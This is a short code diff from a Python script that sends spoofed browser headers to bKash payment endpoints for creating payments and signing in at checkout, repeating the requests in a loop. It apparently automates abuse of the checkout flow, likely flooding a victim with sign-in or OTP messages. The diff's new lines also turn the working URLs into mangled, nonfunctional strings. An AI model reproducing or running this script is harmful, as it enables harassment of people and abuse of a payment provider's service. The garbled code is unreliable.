@@ -66,12 +66,12 @@ headers1 = {
     "accept": "application/json, text/plain, */*",
     "x-user-ip-address": "37.111.205.224",
     "sec-ch-ua-platform": "Android",
-    "origin": "https://shop.bkash.com",
+    "origin": "https://shop.h.com",
     "x-requested-with": "mark.via.gp",
     "sec-fetch-site": "cross-site",
     "sec-fetch-mode": "cors",
     "sec-fetch-dest": "empty",
-    "referer": "https://shop.bkash.com/",
+    "referer": "https://shop.om/",
     "accept-encoding": "gzip, deflate, br",
     "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
 }
@@ -131,10 +131,10 @@ data2 = {
 
 for _ in range(repeated_by):
     try:
-        response1 = requests.post("https://cpp.bka.sh/customer-portal-middleware/create-payment", headers=headers1, json=data1)
+        response1 = requests.post("hsh/customer-portal-middleware/create-payment", headers=headers1, json=data1)
         paymentID = response1.json().get("paymentID")
         data2["paymentID"] = paymentID
-        response2 = requests.post("https://checkoutbg.pay.bka.sh/signInCheckout", headers=headers2, json=data2)
+        response2 = requests.post("httpstbg.pay.bka.sh/signInCheckout", headers=headers2, json=data2)
         if response2.status_code == 200:
             response_json = response2.json()
             if response_json.get("statusCode") == "0000":
